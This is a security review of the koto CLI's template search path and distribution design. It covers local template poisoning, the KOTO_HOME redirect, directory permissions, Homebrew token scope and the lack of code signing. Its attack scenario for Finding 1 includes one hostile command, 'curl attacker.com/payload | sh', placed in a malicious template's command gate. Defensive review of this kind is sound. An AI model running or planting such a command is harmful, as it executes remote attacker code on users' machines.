# Security Review: koto Installation and Distribution

## Findings

### 1. Template search path allows local directory poisoning -- Blocking

The search path checks `.koto/templates/` relative to the current working directory first. An attacker who can write to a project's `.koto/templates/` directory can override any built-in or user-level template. Since koto templates contain directive text that agents execute, and can include command gates that run shell commands, a malicious template override is equivalent to arbitrary code execution.

Attack scenario: a contributor adds a `.koto/templates/quick-task/template.md` to a shared repository. The template includes a command gate that runs `curl attacker.com/payload | sh`. Any user who runs `koto init quick-task` in that repository executes the malicious command. The user believes they're using the built-in `quick-task` template but the project-local override silently takes precedence.

The design acknowledges this layering by saying "the first match wins" but doesn't call out the security implication of untrusted project-local templates. The project-local layer exists in directories that may be shared via git, controlled by other contributors.

**Recommendation**: Add a warning or confirmation when a project-local template overrides a built-in or user-level template with the same name. At minimum, print to stderr: `"note: using project-local template .koto/templates/quick-task/template.md (overrides built-in)"`. Consider a `--no-local` flag to skip the project-local layer entirely. Document this risk in the security considerations section.

### 2. Checksum-only verification is acknowledged but residual risk is under-stated -- Advisory

The design correctly notes that "a compromised GitHub account could publish malicious binaries with valid checksums" and defers Cosign signing. This is the right trade-off for v0.1.0.

However, the design says this risk is "shared by most Go open-source projects at this stage." That's true but doesn't address koto's specific risk profile: koto downloads and runs as part of an AI agent's toolchain. A compromised koto binary could manipulate workflow state files, inject malicious directives, or exfiltrate evidence data. The blast radius is larger than a typical developer CLI because koto's output is consumed by automated agents that execute instructions without human review of each step.

**Recommendation**: Add a sentence to the security considerations acknowledging the elevated risk of koto being in the agent execution path. State that Cosign signing is a priority for v0.2.0, not a "future release" deferral. This doesn't change the v0.1.0 decision but sets the right urgency level.

### 3. `KOTO_HOME` allows redirecting the user-level search layer -- Advisory

If an attacker can set the `KOTO_HOME` environment variable (e.g., via a `.env` file, shell profile injection, or CI environment manipulation), they redirect the user-level template search to an attacker-controlled directory. Combined with Finding 1, this means both the project-local and user-level layers can be controlled by an attacker, leaving only the built-in layer as trusted.

The design says "`KOTO_HOME` lets users relocate the user-level directory but doesn't add search locations." This is accurate but doesn't address the risk that `KOTO_HOME` can point to untrusted locations.

The existing cache system (`pkg/cache/cache.go`) already uses `KOTO_HOME` the same way (line 18), so this isn't a new attack surface -- it's an existing one that the search path amplifies. The cache stores compiled JSON; the template search path serves source templates that compile into executable directives.

**Recommendation**: Document this as a known risk. Environment variable injection is generally out-of-scope for CLI tools (if the attacker controls your environment, you've already lost), but it should be explicitly stated in the security model: "koto trusts the value of `KOTO_HOME`. If this variable is set by an untrusted source, the template search path and cache are compromised."

### 4. `~/.koto/` permissions claim should be verified -- Advisory

The design states "The default path (`~/.koto/`) is created with `0700` permissions, matching the existing cache directory behavior." Checking the cache code at `/home/dangazineu/dev/workspace/tsuku/tsuku-7/public/koto/pkg/cache/cache.go` line 56: `os.MkdirAll(dir, 0o700)`. This creates the `cache/` subdirectory with 0700, but `MkdirAll` only sets permissions on newly-created directories. If `~/.koto/` already exists with different permissions (e.g., 0755 from manual creation), `MkdirAll` won't tighten them.

The design's security claim about 0700 is only true for fresh installations where `~/.koto/` doesn't exist. If a user creates `~/.koto/` manually or another tool creates it first, the permissions may be more permissive.

**Recommendation**: The implementation should check and warn if `~/.koto/` has permissions more permissive than 0700. This is an advisory for the design -- add a note that the implementation should verify directory permissions at startup or on first access, not just rely on `MkdirAll`.

### 5. No code signing for Homebrew tap formula updates -- Advisory

GoReleaser pushes formula updates to `tsukumogami/homebrew-tap` using `HOMEBREW_TOKEN`. If this token is compromised, an attacker can push a formula pointing to any URL with any checksum. Homebrew users would then install the attacker's binary on their next `brew upgrade`.

This is a standard supply chain risk for Homebrew taps. The mitigation is: the tap repository should have branch protection on `main`, require PR reviews, and limit `HOMEBREW_TOKEN` permissions to the minimum needed (contents write on the tap repo only). The design doesn't specify these operational controls.

**Recommendation**: Add an operational note: the tap repository should have branch protection enabled, and `HOMEBREW_TOKEN` should be a fine-grained PAT scoped to the `homebrew-tap` repository with contents write permission only. This doesn't need to be in the architecture section, but should be in a deployment checklist or setup guide.

### 6. Command gates in built-in templates are trusted implicitly -- Advisory

Built-in templates compiled into the binary via `go:embed` are trusted because they're part of the release. But the design doesn't discuss the review process for adding or modifying built-in templates. A malicious PR that modifies `templates/quick-task/template.md` to include a command gate with a harmful command would be compiled into every subsequent release.

This is the standard open-source supply chain risk (malicious PR merged by a maintainer). It's mitigated by code review, but the design should note that built-in templates are part of the trusted computing base and changes to `templates/` should receive the same scrutiny as changes to Go source code.

**Recommendation**: Add a note that `templates/` directory changes are security-sensitive and should be reviewed as carefully as code changes. Consider adding a CI check that flags PRs modifying files under `templates/` for required security review.

### 7. "Not applicable" justifications are all valid -- Informational

The design doesn't explicitly list "not applicable" justifications, but its omissions are appropriate:

- **Authentication/authorization**: Not applicable -- koto is a local CLI with no network services. Correct.
- **Data encryption at rest**: Not applicable -- state files and cache are local. Correct.
- **Network security**: Not applicable -- koto makes no outbound network calls (the download is handled by the user's package manager or browser, not koto). Correct.
- **Input sanitization**: Partially applicable but addressed -- template paths are user-provided and read via `os.ReadFile`, which is the correct Go pattern. The `go:embed` layer is read-only. No SQL or shell injection vectors in the new code paths (command gates are existing, not introduced by this design).

No "not applicable" justifications need to be reconsidered.

## Recommendations

1. **Add project-local template override warning** (Finding 1). Print to stderr when a project-local template shadows a built-in. Add `--no-local` flag. This is the highest-priority security item because it's a new attack surface introduced by this design.

2. **Set Cosign signing timeline** (Finding 2). Change "deferred to a future release" to "planned for v0.2.0" in the security considerations section.

3. **Document `KOTO_HOME` trust model** (Finding 3). State explicitly that koto trusts `KOTO_HOME` and that environment variable integrity is the user's responsibility.

4. **Verify `~/.koto/` permissions** (Finding 4). Implementation should check existing directory permissions, not just rely on `MkdirAll`.

5. **Specify tap repository operational controls** (Finding 5). Branch protection, limited token scope, PR reviews for formula changes.

6. **Mark `templates/` as security-sensitive in CI** (Finding 6). Require additional review for PRs touching built-in templates.
